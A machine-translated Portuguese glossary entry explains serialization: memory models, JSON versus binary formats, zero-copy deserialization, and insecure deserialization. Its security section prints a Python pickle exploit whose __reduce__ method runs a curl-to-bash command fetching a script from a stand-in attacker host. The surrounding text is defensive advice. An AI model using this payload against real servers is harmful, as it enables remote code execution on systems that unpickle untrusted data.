# O que é Serialization?

*Glossário · Dev · Última atualização: 19 de setembro de 2026*

A serialização é o processo de converter objetos, estruturas de dados e grafos de ponteiros alocados dinamicamente na memória de trabalho (RAM) de uma linguagem de programação em um fluxo de bytes (byte stream) linear e simples ou em um formato de texto que pode ser transmitido pela rede ou armazenado em disco.

## O que é Serialização e por que é obrigatória? Modelo de Memória

Nos sistemas operacionais modernos, cada processo é executado em seu próprio espaço de endereço virtual isolado. Um objeto em tempo de execução; Ele contém variáveis ​​locais na pilha, blocos de memória alocados dinamicamente no heap, ponteiros de função (vtable) e endereços de referência (0x7ffee4b2...).

Essa estrutura de memória não pode ser copiada diretamente para outro ambiente por dois motivos fundamentais:

1. Isolamento de espaço de endereço: os ponteiros de memória são significativos apenas na tabela de endereços virtuais do processo em execução no momento. Quando você envia um ponteiro de memória para outro processo no mesmo servidor ou para um cliente na rede, ocorre um acesso inválido à memória (falha de segmentação) ou corrupção de memória no sistema de destino.
2. Diferenças de arquitetura e endianness: Diferentes arquiteturas de processador (por exemplo, Little-Endian x86-64 vs. hardware de rede Big-Endian) mantêm inteiros multibyte e números de ponto flutuante na memória em diferentes ordenações de bytes. Além disso, as larguras dos ponteiros e os alinhamentos de dados (alinhamento/preenchimento) são diferentes em sistemas de 32 e 64 bits.

O mecanismo de serialização percorre o grafo de objetos na memória (incluindo referências cíclicas) em profundidade ou largura (graph traversal), converte ponteiros locais em relações lógicas e coloca os dados em uma sequência de bytes canônica independente da plataforma.

***Analogia:** Mover um móvel é como desmontá-lo e colocá-lo em uma caixa plana e plana; No destino você abre a caixa e remonta o móvel (desserialização) consultando o manual.*

## Formatos de Serialização: Baseado em Texto vs. Binário

Escolher o formato de serialização correto na arquitetura de software exige um equilíbrio entre legibilidade humana, custo de processamento (parsing) de CPU, largura de banda de rede e segurança de tipos.

- JSON (JavaScript Object Notation): O padrão de fato da web moderna e APIs RESTful. É independente de linguagem, tem suporte nativo em navegadores e é facilmente lido e depurável pelos desenvolvedores.
- Pontos fracos: a análise baseada em texto (lexing, tokenização, conversões de string para número) consome muito CPU. A repetição de nomes de chaves (chaves de campo) em cada registro cria uma sobrecarga desnecessária de carga útil. Além disso, transportar dados binários (por exemplo, uma imagem ou chave criptografada) requer codificação Base64; Isso aumenta o tamanho dos dados em aproximadamente 33%.

- Buffers de protocolo (Protobuf): É um formato binário desenvolvido pelo Google que forma a espinha dorsal da comunicação gRPC e de microsserviços. Ele define tipos de campos e números de campos (tags de campo) com um arquivo de esquema sólido (.proto). Em vez de chaves de texto, rótulos numéricos e codificação inteira de comprimento variável (Varint) são enviados pela rede. Ele consome de 3 a 10 vezes menos largura de banda que JSON e analisa muito mais rápido.
- Apache Avro: Comum no ecossistema de big data (Hadoop, Kafka). O esquema é mantido em um registro central (Registro de Esquema) em vez de ser incorporado em cada mensagem. Desta forma, a carga adicional por mensagem é minimizada.
- MessagePack e BSON: armazena dados em um formato binário compactado, preservando o modelo de valor-chave flexível e sem esquema do JSON.

## Arquitetura de Desserialização Zero-Copy

Em bibliotecas de serialização clássicas (analisadores JSON ou Protobuf padrão), o processo de desserialização é executado com as seguintes etapas:

1. O fluxo de bytes proveniente do socket de rede é gravado em um buffer temporário.
2. O analisador verifica os tipos examinando os bytes.
3. Nova memória é alocada para cada objeto, string e array na área de memória heap (malloc ou gerenciador de memória da linguagem).
4. Os valores são copiados do buffer para os objetos de heap recém-criados.

Em sistemas que processam centenas de milhares de solicitações por segundo, essas alocações de heap e operações de cópia levam a um alto consumo de CPU e pausas do coletor de lixo (Garbage Collector).

**Abordagem Zero-Copy (FlatBuffers, Cap'n Proto):** Nessas bibliotecas, ao serializar dados, eles são colocados no buffer binário de acordo com o alinhamento de memória da estrutura de dados e deslocamentos relativos (relative offsets).

Nenhuma alocação de memória ou cópia de dados ocorre durante a fase de desserialização. O aplicativo mapeia (mmap) o buffer de bytes de entrada diretamente na memória e acessa campos de objetos diretamente por meio de aritmética de ponteiro. O tempo de desserialização é, na verdade, 0 milissegundos. Esta arquitetura; É padrão em negociação de alta frequência (HFT), computação de ponta (Edge AI) e motores de jogos AAA.

## Dimensão de segurança: desserialização insegura (CWE-502)

Vulnerabilidades de segurança catastróficas surgem quando a serialização tenta serializar classes de objetos e comportamentos de tempo de execução, em vez de apenas mover dados puros. A desserialização insegura (serialização reversa insegura), que está na lista dos 10 principais do OWASP, permite que um invasor execute código arbitrário (execução remota de código - RCE) no sistema.

O módulo de serialização integrado do Python, pickle, serializa o método __reduce__ de objetos. Este método define uma função e seus parâmetros a serem chamados durante a desserialização do objeto. Ao abusar deste mecanismo, um invasor pode gerar uma sequência de bytes maliciosa que executa um comando do sistema operacional:

```
# Saldırgan tarafından hazırlanan zararlı serileştirme paketi
class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ('curl -s https://attacker.com/steal.sh | bash',))
```

Assim que esse fluxo de bytes é enviado ao servidor e pickle.loads(payload) é executado, um comando shell não autorizado é executado no servidor. Portanto, quaisquer dados de fontes não confiáveis ​​não devem ser analisados ​​com pickle.

No mecanismo de serialização nativo do Java (ObjectInputStream.readObject()), o carregador de classes carrega a classe do objeto recebido na memória. Atacante; Ele pode construir uma cadeia de execução que executa comandos na memória conectando métodos de classes em bibliotecas instaladas no sistema (por exemplo, Apache Commons Collections ou Spring Framework) (cadeia de gadgets).

- Nunca use formatos integrados à linguagem contendo código executável ou definições de classe (Python pickle, serialização nativa de Java, desserialização de PHP) nos limites da rede.
- Escolha formatos que transportam apenas dados puros e validem a estrutura de dados em relação ao esquema (JSON + Pydantic/Zod ou Protobuf).
- Implemente autenticação e controle de integridade de mensagens (HMAC ou TLS) em trocas de dados binários.

## Perguntas frequentes

**Qual é a principal diferença entre serialização e desserialização?**

Serialização é o processo de conversão de objetos ativos na memória em um fluxo de bytes/texto que pode ser armazenado ou transmitido. A desserialização é o processo de ler e analisar essa sequência de bytes e convertê-la em um objeto que funciona na memória do sistema de destino.

**Quando Protobuf ou FlatBuffers devem ser usados ​​em vez de JSON em projetos web?**

Para clientes da Web públicos e APIs públicas, o JSON é ideal devido à compatibilidade do navegador e à facilidade de depuração. No entanto, para microsserviços internos, back-ends de aplicativos móveis ou fluxos de dados em tempo real, Protobuf ou FlatBuffers devem ser preferidos para limitar a largura de banda da rede e reduzir o custo de decomposição da CPU.

**Como funciona o ataque de desserialização insegura e como evitá-lo?**

O invasor injeta funções maliciosas ou estruturas de classe nos dados serializados para serem executados durante a desserialização. Quando o servidor analisa esses dados, comandos do sistema podem ser acionados. Para evitar isso, os formatos que transportam lógica de classe devem ser abandonados e apenas os formatos de esquema que transportam dados puros (Protobuf, JSON Schema) devem ser usados.

**O que significa desserialização de cópia zero?**

É uma técnica de leitura de dados diretamente com deslocamentos de ponteiro na memória buffer, em vez de copiar o fluxo de bytes de entrada alocando novas áreas de memória. Ele alivia o processador e o coletor de lixo redefinindo a alocação de memória.

**O que é evolução do esquema? Como garantir compatibilidade com versões anteriores e futuras?**

Os modelos de dados mudam à medida que o software é atualizado. Sistemas como Protobuf e Avro fornecem IDs numéricos exclusivos aos campos, permitindo que clientes antigos ignorem novos campos (compatibilidade com versões anteriores) e novos clientes leiam dados antigos com valores padrão (compatibilidade com versões anteriores).

## Termos relacionados

- [API](https://trescout.com/pt/dictionary/api/)
- [Data Pipeline](https://trescout.com/pt/dictionary/data-pipeline/)
- [Memory Management](https://trescout.com/pt/dictionary/memory-management/)
- [Network Stack](https://trescout.com/pt/dictionary/network-stack/)

## Ferramentas relacionadas

- [YAML Cpp](https://trescout.com/pt/discover/yaml-cpp/)

Esta explicação foi escrita em linguagem simples para a TreScout e **traduzida automaticamente** do original em turco · a versão turca é a que vale. Se algo parecer errado ou faltando, escreva para [hello@trescout.com](mailto:hello@trescout.com). [Ler em turco →](https://trescout.com/dictionary/serialization/)

---
Fonte: TreScout Glossário · https://trescout.com/pt/dictionary/serialization/
